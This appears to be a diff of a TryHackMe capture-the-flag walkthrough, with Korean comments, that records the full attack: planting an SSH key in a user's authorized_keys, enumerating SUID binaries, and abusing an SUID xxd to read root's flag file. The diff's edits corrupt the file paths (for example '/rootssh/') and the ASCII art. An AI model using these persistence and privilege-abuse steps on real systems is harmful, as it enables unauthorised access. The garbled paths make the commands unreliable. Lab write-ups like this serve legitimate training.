@@ -489,11 +489,11 @@ $
 ┌──(root㉿docker-desktop)-[/]
 └─# ssh-keygen
 Generating public/private ed25519 key pair.
-Enter file in which to save the key (/root/.ssh/id*ed25519):
-Enter passphrase for "/root/.ssh/id_ed25519" (empty for no passphrase):
+Enter file in which to save the key (/rootssh/id*ed25519):
+Enter passphrase for "/rootssh/id_ed25519" (empty for no passphrase):
 Enter same passphrase again:
-Your identification has been saved in /root/.ssh/id_ed25519
-Your public key has been saved in /root/.ssh/id_ed25519.pub
+Your identification has been saved in /rootssh/id_ed25519
+Your public key has been saved in /rootssh/id_ed25519.pub
 The key fingerprint is:
 SHA256:qnl77ebZO2ZVigRWMblteFIxPxaeJg8NeAitMYKdyRo root@docker-desktop
 The key's randomart image is:
@@ -510,21 +510,21 @@ The key's randomart image is:
 +----[SHA256]-----+
 
 ┌──(root㉿docker-desktop)-[/]
-└─# cat /root/.ssh/id_ed25519.pub
+└─# cat /rootssh/id_ed25519.pub
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmlWmqRlmMIc40OFLpAQwuH+Dvu7WWOVDaK/djJ2F3I root@docker-desktop
 
 # 공개키 설정
 
-echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmlWmqRlmMIc40OFLpAQwuH+Dvu7WWOVDaK/djJ2F3I root@docker-desktop' > /home/comte/.ssh/authorized_keys
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmlWmqRlmMIc40OFLpAQwuH+Dvu7WWOVDaK/djJ2F3I root@docker-desktop' > /home/comtessh/authorized_keys
 
 # ip: 10.201.71.110
 
 # ssh access
 
-ssh -i /root/.ssh/id_ed25519 comte@10.201.71.110
+ssh -i /rootssh/id_ed25519 comte@10.201.71.110
 
 ┌──(root㉿docker-desktop)-[/]
-└─# ssh -i /root/.ssh/id_ed25519 comte@10.201.71.110
+└─# ssh -i /rootssh/id_ed25519 comte@10.201.71.110
 The authenticity of host '10.201.71.110 (10.201.71.110)' can't be established.
 ED25519 key fingerprint is SHA256:fEZEYx5zTn15pnnIUB/bgh+k+/4/LT69vsGaFpZdfcY.
 This key is not known by any other names.
@@ -647,7 +647,7 @@ comte@ip-10-201-71-110:/$ find / -perm -4000 -type f 2>/dev/null
 /usr/lib/policykit-1/polkit-agent-helper-1
 comte@ip-10-201-71-110:/$
 
-# ssh -i /root/.ssh/id_ed25519 comte@10.201.71.110
+# ssh -i /rootssh/id_ed25519 comte@10.201.71.110
 
 comte@ip-10-201-71-110:/$ find /bin /usr/bin /sbin /usr/sbin /usr/local/bin -perm -4000 -type f 2>/dev/null
 /usr/bin/su
@@ -826,23 +826,23 @@ stdout
 fputs
 fclose
 strtoul
-**ctype_b_loc
+ctype_b_loc
 stderr
 fwrite
 fprintf
 fdopen
-**ctype*toupper_loc
-**strcpy_chk
-**cxa_finalize
-**sprintf_chk
+ctype*toupper_loc
+strcpy_chk
+cxa_finalize
+sprintf_chk
 strcmp
-**libc_start_main
+libc_start_main
 ferror
 GLIBC_2.3.4
 GLIBC_2.2.5
 GLIBC_2.3
 \_ITM_deregisterTMCloneTable
-**gmon_start**
+gmon_start
 \_ITM_registerTMCloneTable
 AVAUI
 ATUSH
@@ -1011,10 +1011,10 @@ LFILE=/root/root.txt
 /opt/xxd "$LFILE" | xxd -r
 
 comte@ip-10-201-71-110:~$ /opt/xxd "$LFILE" | xxd -r
-\_ \_ \_ \_ **
-\_**| |** \_** **\_ \_** **_ (_)\_** | (_)/ _| **\_
-/ **| '_ \ / _ \/ _ \/ \_\_|/ _ \ | / **| | | | |_ / _ \
-| (**| | | | **/ **/\_\_ \ **/ | \__ \ | | | _| **/
-\_**|_| |_|\_**|\_**||\_**/\_**| |_|_**/ |_|_|\_| \_\_\_|
+\_ \_ \_ \_ 
+\_| | \_ \_ \_ _ (_)\_ | (_)/ _| \_
+/ | '_ \ / _ \/ _ \/ \_\_|/ _ \ | / | | | | |_ / _ \
+| (| | | | / /\_\_ \ / | \__ \ | | | _| /
+\_|_| |_|\_|\_||\_/\_| |_|_/ |_|_|\_| \_\_\_|
 
 THM{dca75486094810807faf4b7b0a929b11e5e0167c}
